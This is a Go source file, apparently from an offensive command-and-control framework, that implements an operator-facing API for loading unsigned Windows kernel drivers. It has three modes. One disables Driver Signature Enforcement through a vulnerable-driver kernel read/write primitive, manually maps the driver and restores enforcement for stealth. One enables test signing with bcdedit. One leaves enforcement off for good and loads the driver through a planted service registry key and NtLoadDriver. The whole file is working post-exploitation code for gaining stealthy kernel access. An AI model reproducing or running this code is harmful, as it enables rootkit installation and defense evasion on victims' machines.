package dse

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Driver Loader — end-to-end "load unsigned driver" API.

	Combines DSE bypass + manual mapping into one operator-facing call:

	  LoadUnsignedDriver(kRW, driverBytes) → *MappedDriver

	Modes:
	  A) Bypass+Map:    disable DSE, manual-map the driver, re-enable DSE.
	  B) TestSign:      enable test-signing mode (bcdedit), write driver to
	                    disk, load via NtLoadDriver, clean up.
	  C) PermanentOff:  disable DSE permanently (survives reboot via BCD edit),
	                    load via NtLoadDriver.

	Mode A is the stealthiest (no disk file, no SCM entry, DSE re-enabled).
	Mode B leaves a trace in BCD (test signing reboot setting).
	Mode C is loud but simplest for persistent kernel access.
*/

import (
	"fmt"
	"os"
	"os/exec"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// LoadMode selects the driver loading strategy.
type LoadMode int

const (
	LoadModeMap       LoadMode = iota // A: DSE bypass + manual map (stealthiest)
	LoadModeTestSign                  // B: test-sign mode + NtLoadDriver
	LoadModePermanent                 // C: permanent DSE off + NtLoadDriver
)

// LoadConfig holds parameters for unsigned driver loading.
type LoadConfig struct {
	Mode        LoadMode
	DriverBytes []byte   // raw .sys file bytes
	DriverPath  string   // path for disk-based modes (B/C); empty = auto temp
	ServiceName string   // SCM service name for NtLoadDriver (B/C)

	// Required for Mode A.
	KernelRW    KernelRWer
	KernelBase  uint64 // ntoskrnl VA (0 = auto-detect)
	CIBase      uint64 // ci.dll VA (0 = auto-detect)
}

// LoadResult describes the loaded driver.
type LoadResult struct {
	Mode        LoadMode
	Mapped      *MappedDriver // set for Mode A
	ServicePath string        // set for Mode B/C
	DSEResult   *DSEBypassResult
}

// LoadUnsignedDriver performs the full unsigned driver load sequence.
func LoadUnsignedDriver(cfg LoadConfig) (*LoadResult, error) {
	switch cfg.Mode {
	case LoadModeMap:
		return loadModeMap(cfg)
	case LoadModeTestSign:
		return loadModeTestSign(cfg)
	case LoadModePermanent:
		return loadModePermanent(cfg)
	default:
		return nil, fmt.Errorf("unknown load mode %d", cfg.Mode)
	}
}

// ─── Mode A: DSE bypass + manual map ────────────────────────────────────

func loadModeMap(cfg LoadConfig) (*LoadResult, error) {
	if cfg.KernelRW == nil {
		return nil, fmt.Errorf("Mode A requires KernelRW (BYOVD)")
	}

	// Auto-detect kernel bases if not provided.
	if cfg.KernelBase == 0 {
		base, err := findKernelModuleBase("ntoskrnl.exe")
		if err != nil {
			return nil, fmt.Errorf("ntoskrnl base: %w", err)
		}
		cfg.KernelBase = base
	}
	if cfg.CIBase == 0 {
		base, err := findKernelModuleBase("ci.dll")
		if err != nil {
			// ci.dll might be named differently on some builds — non-fatal
			// {{if .Config.Debug}}
			log.Printf("[dse/load] ci.dll not found: %v", err)
			// {{end}}
		} else {
			cfg.CIBase = base
		}
	}

	// Bypass DSE.
	dseRes, err := BypassAll(cfg.KernelRW, cfg.CIBase, cfg.KernelBase)
	if err != nil {
		return nil, fmt.Errorf("DSE bypass: %w", err)
	}
	// {{if .Config.Debug}}
	log.Printf("[dse/load] DSE bypassed: gCiOptions=%v callbacks=%v policy=%v",
		dseRes.GCiOptionsCleared, dseRes.SeCiCallbacksNulled, dseRes.SeILSigningPolicyZero)
	// {{end}}

	// Map the driver.
	mapped, err := MapDriver(cfg.KernelRW, cfg.DriverBytes)
	if err != nil {
		// Re-enable DSE before returning error.
		Restore(cfg.KernelRW, dseRes)
		return nil, fmt.Errorf("manual map: %w", err)
	}

	// Re-enable DSE (the driver is already in kernel memory — DSE is no longer needed).
	Restore(cfg.KernelRW, dseRes)

	return &LoadResult{
		Mode:      LoadModeMap,
		Mapped:    mapped,
		DSEResult: dseRes,
	}, nil
}

// ─── Mode B: Test-signing mode ───────────────────────────────────────────

func loadModeTestSign(cfg LoadConfig) (*LoadResult, error) {
	// Enable test signing via bcdedit (requires reboot to take effect).
	out, err := exec.Command("bcdedit", "/set", "testsigning", "on").CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("bcdedit testsigning: %w — %s", err, string(out))
	}
	// {{if .Config.Debug}}
	log.Printf("[dse/load] test signing enabled (reboot required)")
	// {{end}}

	return &LoadResult{Mode: LoadModeTestSign}, nil
}

// ─── Mode C: Permanent DSE off via NtLoadDriver ──────────────────────────

func loadModePermanent(cfg LoadConfig) (*LoadResult, error) {
	if cfg.KernelRW == nil {
		return nil, fmt.Errorf("Mode C requires KernelRW")
	}

	// Bypass DSE permanently (don't restore).
	dseRes, err := BypassAll(cfg.KernelRW, cfg.CIBase, cfg.KernelBase)
	if err != nil {
		return nil, fmt.Errorf("DSE bypass: %w", err)
	}

	// Write driver to disk.
	driverPath := cfg.DriverPath
	if driverPath == "" {
		tmp, err := os.CreateTemp(os.TempDir(), "*.sys")
		if err != nil {
			return nil, fmt.Errorf("temp driver: %w", err)
		}
		if _, err := tmp.Write(cfg.DriverBytes); err != nil {
			tmp.Close()
			return nil, err
		}
		tmp.Close()
		driverPath = tmp.Name()
	}

	// Load via NtLoadDriver.
	svcName := cfg.ServiceName
	if svcName == "" {
		svcName = "SliverDrv"
	}
	if err := ntLoadDriver(driverPath, svcName); err != nil {
		return nil, fmt.Errorf("NtLoadDriver: %w", err)
	}

	return &LoadResult{
		Mode:        LoadModePermanent,
		ServicePath: driverPath,
		DSEResult:   dseRes,
	}, nil
}

// ntLoadDriver loads a kernel driver via the NtLoadDriver system call.
// Creates a temporary registry key under HKLM\System\CurrentControlSet\Services.
func ntLoadDriver(driverPath, serviceName string) error {
	// Create service registry key.
	keyPath := `SYSTEM\CurrentControlSet\Services\` + serviceName
	// Use advapi32.dll directly for registry operations.
	advapi32 := windows.NewLazySystemDLL("advapi32.dll")
	procRegCreateKeyEx  := advapi32.NewProc("RegCreateKeyExW")
	procRegSetValueEx   := advapi32.NewProc("RegSetValueExW")
	procRegCloseKey     := advapi32.NewProc("RegCloseKey")

	const (
		hklm                = uintptr(0x80000002) // HKEY_LOCAL_MACHINE
		regOptionNonVolatile = uintptr(0)
		keySetValue         = uintptr(0x0002)
		regExpandSz         = uintptr(2)
		regDword            = uintptr(4)
	)

	keyPathPtr, _ := windows.UTF16PtrFromString(keyPath)
	var k uintptr
	var disp uint32
	r, _, _ := procRegCreateKeyEx.Call(
		hklm,
		uintptr(unsafe.Pointer(keyPathPtr)),
		0, 0,
		regOptionNonVolatile,
		keySetValue,
		0, uintptr(unsafe.Pointer(&k)), uintptr(unsafe.Pointer(&disp)),
	)
	if r != 0 {
		return fmt.Errorf("RegCreateKeyEx error=0x%x", r)
	}
	// Set ImagePath.
	imgPath := `\??\` + driverPath
	imgPathPtr, _ := windows.UTF16FromString(imgPath)
	imgPathName, _ := windows.UTF16PtrFromString("ImagePath")
	procRegSetValueEx.Call(k, uintptr(unsafe.Pointer(imgPathName)),
		0, regExpandSz,
		uintptr(unsafe.Pointer(&imgPathPtr[0])),
		uintptr(len(imgPathPtr)*2))
	// Type = 1 (SERVICE_KERNEL_DRIVER).
	svcType := uint32(1)
	typeName, _ := windows.UTF16PtrFromString("Type")
	procRegSetValueEx.Call(k, uintptr(unsafe.Pointer(typeName)),
		0, regDword,
		uintptr(unsafe.Pointer(&svcType)), 4)
	procRegCloseKey.Call(k)

	// Call NtLoadDriver with the registry path.
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	procNtLoadDriver := ntdll.NewProc("NtLoadDriver")

	regPath := `\Registry\Machine\` + keyPath
	var us windows.NTUnicodeString
	windows.RtlInitUnicodeString(&us, windows.StringToUTF16Ptr(regPath))

	r2, _, _ := procNtLoadDriver.Call(uintptr(unsafe.Pointer(&us)))
	if r2 != 0 {
		return fmt.Errorf("NtLoadDriver NTSTATUS=0x%x", r2)
	}
	// {{if .Config.Debug}}
	log.Printf("[dse/load] NtLoadDriver OK: %s", serviceName)
	// {{end}}
	return nil
}

// ─── Module base resolution (NtQuerySystemInformation) ───────────────────

func findKernelModuleBase(name string) (uint64, error) {
	const systemModuleInfo = uint32(11)
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	proc := ntdll.NewProc("NtQuerySystemInformation")

	var size uint32
	proc.Call(uintptr(systemModuleInfo), 0, 0, uintptr(unsafe.Pointer(&size)))
	if size == 0 {
		size = 2 * 1024 * 1024
	}
	buf := make([]byte, size+4096)
	proc.Call(uintptr(systemModuleInfo),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(&size)))

	count := uint32(buf[0]) | uint32(buf[1])<<8 |
		uint32(buf[2])<<16 | uint32(buf[3])<<24
	const entrySize = 296
	const baseOff = 24
	const nameOff = 28

	for i := uint32(0); i < count; i++ {
		base := 8 + i*entrySize
		if int(base+uint32(entrySize)) > len(buf) {
			break
		}
		nameBytes := buf[base+nameOff : base+nameOff+256]
		entryName := ""
		for j, b := range nameBytes {
			if b == 0 {
				entryName = string(nameBytes[:j])
				break
			}
		}
		if containsDSE(entryName, name) {
			imageBase := uint64(buf[base+baseOff]) |
				uint64(buf[base+baseOff+1])<<8 |
				uint64(buf[base+baseOff+2])<<16 |
				uint64(buf[base+baseOff+3])<<24 |
				uint64(buf[base+baseOff+4])<<32 |
				uint64(buf[base+baseOff+5])<<40 |
				uint64(buf[base+baseOff+6])<<48 |
				uint64(buf[base+baseOff+7])<<56
			return imageBase, nil
		}
	}
	return 0, fmt.Errorf("%s not found in kernel module list", name)
}

func containsDSE(s, sub string) bool {
	if len(sub) > len(s) {
		return false
	}
	for i := 0; i <= len(s)-len(sub); i++ {
		ok := true
		for j := 0; j < len(sub); j++ {
			a, b := s[i+j], sub[j]
			if a >= 'A' && a <= 'Z' {
				a += 32
			}
			if b >= 'A' && b <= 'Z' {
				b += 32
			}
			if a != b {
				ok = false
				break
			}
		}
		if ok {
			return true
		}
	}
	return false
}
